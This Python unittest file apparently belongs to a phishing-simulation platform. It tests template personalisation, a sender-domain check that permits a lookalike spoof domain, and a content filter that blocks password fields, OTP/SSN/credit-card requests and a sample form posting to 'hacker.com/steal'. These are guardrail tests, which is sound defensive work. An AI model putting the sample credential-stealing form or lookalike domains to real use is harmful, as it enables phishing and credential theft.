import unittest
from unittest.mock import MagicMock
from uuid import uuid4
from fastapi import HTTPException
import sys
import os

# Add parent directory to path so python can find app
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from app.routes.campaigns import personalize_content, validate_sender_domain, check_sensitive_content
from app.models.company import Company

class TestTemplateSystem(unittest.TestCase):

    def test_token_personalization_new_tokens(self):
        text = "Hello {{EmployeeName}}, welcome to {{Company}}. Click {{TrackingLink}}."
        result = personalize_content(text, "Alice Smith", "Acme Corp", "https://phintra.com/report/123")
        self.assertEqual(result, "Hello Alice Smith, welcome to Acme Corp. Click https://phintra.com/report/123.")

    def test_token_personalization_legacy_tokens(self):
        text = "Dear {{employee_name}}, update your status for {{company_name}} via {{login_link}}."
        result = personalize_content(text, "Bob Jones", "Beta LLC", "https://phintra.com/report/456")
        self.assertEqual(result, "Dear Bob Jones, update your status for Beta LLC via https://phintra.com/report/456.")

    def test_token_personalization_mixed_and_fallbacks(self):
        text = "{{EmployeeName}} (aka {{employee_name}}) works at {{Company}} / {{company_name}}."
        result = personalize_content(text, "Charlie", "CompanyX", "http://tracking")
        self.assertEqual(result, "Charlie (aka Charlie) works at CompanyX / CompanyX.")

    def test_token_personalization_edge_cases(self):
        long_name = "Dr. François-Marie Arouet d'Albret (Voltaire) & Co!@#$%^&*()"
        text = "Name: {{EmployeeName}}"
        result = personalize_content(text, long_name, "Company", "http://link")
        self.assertEqual(result, f"Name: {long_name}")

        self.assertEqual(personalize_content("", "Name", "Co", "http"), "")
        self.assertIsNone(personalize_content(None, "Name", "Co", "http"))

    def test_validate_sender_domain_restricted(self):
        db_mock = MagicMock()
        admin_id = uuid4()
        
        with self.assertRaises(HTTPException) as ctx:
            validate_sender_domain("test@gmail.com", db_mock, admin_id)
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("restricted public or company domain", ctx.exception.detail)

        with self.assertRaises(HTTPException) as ctx:
            validate_sender_domain("microsoft.com", db_mock, admin_id)
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("restricted public or company domain", ctx.exception.detail)

    def test_validate_sender_domain_company_impersonation(self):
        db_mock = MagicMock()
        admin_id = uuid4()

        mock_company = Company(company_name="Acme Corp", company_email="info@acme.com")
        db_mock.query().filter().first.return_value = mock_company

        with self.assertRaises(HTTPException) as ctx:
            validate_sender_domain("admin@acme.com", db_mock, admin_id)
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("company's official domain", ctx.exception.detail)

    def test_validate_sender_domain_allowed(self):
        db_mock = MagicMock()
        admin_id = uuid4()

        mock_company = Company(company_name="Acme Corp", company_email="info@acme.com")
        db_mock.query().filter().first.return_value = mock_company

        try:
            validate_sender_domain("security-update@acme-secure-portal.com", db_mock, admin_id)
        except HTTPException:
            self.fail("validate_sender_domain raised HTTPException unexpectedly on a safe spoof domain!")

    def test_check_sensitive_content_password_field(self):
        with self.assertRaises(HTTPException) as ctx:
            check_sensitive_content("Please input password: <input type='password' name='pass'>")
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("password input fields", ctx.exception.detail)

    def test_check_sensitive_content_forms(self):
        with self.assertRaises(HTTPException) as ctx:
            check_sensitive_content("<form action='http://hacker.com/steal'>Submit</form>")
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("form elements", ctx.exception.detail)

    def test_check_sensitive_content_keywords(self):
        with self.assertRaises(HTTPException) as ctx:
            check_sensitive_content("Provide your OTP token for verification")
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("restricted keyword/topic: 'otp'", ctx.exception.detail)

        with self.assertRaises(HTTPException) as ctx:
            check_sensitive_content("We need your SSN")
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("ssn", ctx.exception.detail)

        with self.assertRaises(HTTPException) as ctx:
            check_sensitive_content("Enter your credit card number to verify billing")
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("credit card number", ctx.exception.detail)

    def test_check_sensitive_content_safe(self):
        try:
            check_sensitive_content("This is a safe notification about your upcoming schedule review. Please click the link to acknowledge.")
        except HTTPException:
            self.fail("check_sensitive_content raised HTTPException unexpectedly on safe text!")

if __name__ == '__main__':
    unittest.main()
